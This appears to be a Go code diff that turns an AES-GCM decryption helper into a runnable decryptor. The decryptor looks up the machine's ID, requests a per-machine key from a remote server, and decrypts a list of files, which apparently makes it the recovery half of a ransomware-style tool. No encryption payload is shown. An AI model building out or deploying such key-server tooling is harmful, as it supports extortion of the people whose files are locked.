@@ -1,9 +1,20 @@
-package main
+package decrypt
 
 import (
+	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
 	"errors"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"net/url"
+	"os"
+	"path/filepath"
+	"runtime"
+
+	"github.com/denisbrodbeck/machineid"
 )
 
 // Decrypt decrypts data using 256-bit AES-GCM.  This both hides the content of
@@ -31,7 +42,6 @@ func Decrypt(ciphertext []byte, key *[32]byte) (plaintext []byte, err error) {
 	)
 }
 
-/*
 func main() {
 	var files []string
 	var counter int = 1
@@ -45,7 +55,7 @@ func main() {
 	payload := url.Values{}
 	payload.Set("id", id)
 
-	resp, err := http.Get("http://" + server + "/key/?" + payload.Encode())
+	resp, err := http.Get("http://" + instances.server + "/key/?" + payload.Encode())
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -98,5 +108,3 @@ func main() {
 	}
 	fmt.Printf("\n%d files decrypted.\n", len(files))
 }
-
-*/
